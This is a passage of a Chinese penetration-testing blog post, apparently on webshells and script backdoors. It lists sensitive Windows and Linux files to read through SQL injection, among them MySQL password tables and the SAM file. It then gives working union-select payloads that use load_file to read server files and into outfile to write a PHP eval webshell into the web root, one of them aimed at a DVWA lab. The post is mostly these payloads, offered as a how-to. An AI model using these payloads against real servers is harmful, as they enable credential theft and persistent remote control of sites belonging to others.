+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</span><br><span class="line">c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</span><br></pre></td></tr></table></figure>
+
+<p>LUNIX/UNIX 下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</span><br><span class="line">&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</span><br></pre></td></tr></table></figure>
+
+<h2 id="服务器读取文件"><a href="#服务器读取文件" class="headerlink" title="服务器读取文件"></a>服务器读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union%20select%201,load_file(&#39;c:\\boot.ini&#39;)+--+&amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p>写webshell获取权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select &quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;&quot;,2 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot;+--+&amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>利用sql注入写入webshell<br>假设我们通过phpinfo文件知道了网站的物理路径，接下来我们通过使用union select语句来写入webshell.写入需要你有写入权限等。<br>‘ union select 1,’‘ INTO OUTFILE ‘/var/www/dvwa/cmd.php’ +–+   //这种反斜找扛/本地没测试，大家测试一下，推见大家用两个反\方法，例如:<br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.105:8080/dvwa/vulnerabilities/sqli/?id=1%27">http://192.168.0.105:8080/dvwa/vulnerabilities/sqli/?id=1’</a> union select “<?php @eval($_POST['chopper']);?>“,2 into outfile “c:\php\htdocs\dvwa\123.php”+–+&amp;Submit=Submit</p>
+<p><img src="/image/webshell/5.jpg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2019/11/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">https://zhangyanlady.github.io/2019/11/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/20/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">web常见漏洞</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%E5%8F%8A%E7%BD%91%E7%AB%99/">信息收集所需工具及网站</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
